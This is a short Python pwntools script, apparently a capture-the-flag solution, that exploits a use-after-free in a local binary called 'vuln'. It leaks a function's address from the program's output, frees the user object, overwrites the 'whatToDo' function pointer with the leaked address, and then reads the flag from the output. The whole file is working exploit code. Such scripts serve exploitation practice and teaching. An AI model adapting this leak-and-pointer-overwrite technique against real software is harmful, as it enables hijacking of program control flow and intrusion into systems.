#!/usr/bin/python
from pwn import *

io = process("./vuln")

# Leaking hahaexploitgobrrr address
log.progress("Stage 1: leaking hahaexploitgobrrr address")

io.sendline(b"s")
addr = io.recv()
addr_lines = addr.split(b"\n")

for line in addr_lines:
    if b"OOP!" in line:
        addr = line[19:]
        break


addr = addr.strip().decode()
addr = int(addr, 16)
addr = p32(addr)

log.success(f"&hahaexploitgobrrr = 0x{u32(addr):08x}")

# Freeing user obj
log.progress("Stage 2: freeing user obj")

io.sendline(b"i")
io.sendline(b"y")

# Overwriting the whatToDo ptr
log.progress("Stage 3: Overwriting the whatToDo ptr")

io.sendline(b"l")
io.sendline(addr)

log.success("Done!")

flag = io.recv() # getting the output
flag = flag.split(b"\n") # spliting the lines

for line in flag: # searchs between lines
    if b"{" in line: # if the line is contains "{"    (likely it's a flag)
        flag = str(line)

log.success(f"Flag: {flag}")
